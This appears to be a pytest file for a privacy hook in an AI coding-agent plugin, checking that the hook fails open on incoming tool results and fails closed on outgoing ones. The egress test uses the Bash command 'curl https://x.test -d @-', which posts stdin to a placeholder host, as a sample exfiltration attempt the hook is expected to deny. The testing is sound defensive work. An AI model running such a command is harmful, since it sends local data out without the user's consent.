import json
import subprocess
import sys
from pathlib import Path

HANDLER = Path(__file__).resolve().parents[1] / "hooks" / "handler.py"


def run(payload: dict, env: dict | None = None) -> tuple[int, str]:
    p = subprocess.run([sys.executable, str(HANDLER)],
                       input=json.dumps(payload), capture_output=True,
                       text=True, env={"PATH": "/usr/bin:/bin", **(env or {})})
    return p.returncode, p.stdout


def test_client_imports_only_stdlib():
    src = HANDLER.read_text()
    for banned in ("import privacy_hud", "from privacy_hud", "import transformers",
                   "import sqlite3", "import requests"):
        assert banned not in src


def test_missing_daemon_on_ingress_fails_open(tmp_path):
    code, out = run({"hook_event_name": "PostToolUse", "session_id": "s1"},
                    {"PLUGIN_DATA": str(tmp_path), "PRIVACY_HUD_NO_SPAWN": "1"})
    assert code == 0
    assert json.loads(out or "{}").get("hookSpecificOutput", {}) \
        .get("permissionDecision") != "deny"


def test_missing_daemon_on_egress_fails_closed(tmp_path):
    code, out = run({"hook_event_name": "PreToolUse", "session_id": "s1",
                     "tool_name": "Bash",
                     "tool_input": {"command": "curl https://x.test -d @-"}},
                    {"PLUGIN_DATA": str(tmp_path), "PRIVACY_HUD_NO_SPAWN": "1"})
    assert code == 0
    assert json.loads(out)["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_malformed_stdin_exits_zero_and_silent(tmp_path):
    p = subprocess.run([sys.executable, str(HANDLER)], input="not json",
                       capture_output=True, text=True,
                       env={"PATH": "/usr/bin:/bin", "PLUGIN_DATA": str(tmp_path)})
    assert p.returncode == 0
    assert p.stdout.strip() in ("", "{}")
